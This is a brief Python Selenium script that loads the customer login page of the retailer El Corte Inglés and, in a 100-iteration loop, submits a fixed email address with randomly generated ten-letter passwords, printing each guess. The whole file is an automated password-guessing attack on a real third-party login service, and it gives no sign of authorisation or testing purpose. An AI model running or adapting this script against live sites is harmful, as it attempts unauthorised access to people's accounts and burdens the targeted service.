import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://cuenta.elcorteingles.es/oauth/authorize?response_type=code&scope=openid%20profile%20plans&client_id=rjx5snOWlh40SgcE0dg2guk4YnXhECYd&redirect_uri=https%3A%2F%2Fwww.elcorteingles.es%2Fecistore%2Fsession%2Fcallback%3Fto%3D%252F&locale=es#_ga=2.154615679.611860981.1634499846-1356385289.1632193391")
time.sleep(5)
letters = string.ascii_lowercase
for x in range(100):
    usr = driver.find_element_by_name("login")
    usr.clear()
    usr.send_keys("wigid99193@wawue.com")
    psw = driver.find_element_by_name("password")
    str = ''.join(random.choice(letters) for i in range(10))
    psw.send_keys(str)
    print(str)
    clk = driver.find_element_by_xpath("/html/body/div[1]/div/div/div[1]/div[2]/form/fieldset/div/div[2]/div/div[2]/input").click()